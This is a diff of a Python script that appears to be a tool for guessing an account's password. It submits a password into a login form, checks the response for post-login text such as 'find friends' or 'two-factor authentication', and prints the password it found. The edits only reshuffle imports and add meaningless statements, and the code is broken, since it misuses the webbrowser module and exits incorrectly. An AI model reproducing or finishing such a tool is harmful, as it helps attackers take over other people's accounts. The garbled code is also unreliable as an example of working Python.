@@ -1,6 +1,5 @@
 import sys 
 import os
-from tkinter import BROWSE
 
 
 try:
@@ -14,7 +13,7 @@ import fileinput
 from socket import timeout
 import sys
 from argparse import FileType
-from ast import Break, Continue, If, Try
+from ast import Break, Continue, If, Try, excepthandler
 from math import pi
 from tokenize import String
 import webbrowser
@@ -61,8 +60,10 @@ webbrowser.form['pass']=password
 response = webbrowser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
-print('your password is : ',password)
+print("your password is : ",password)
+Break
 
+excepthandler
 timeout(5)
 sys.exit
 
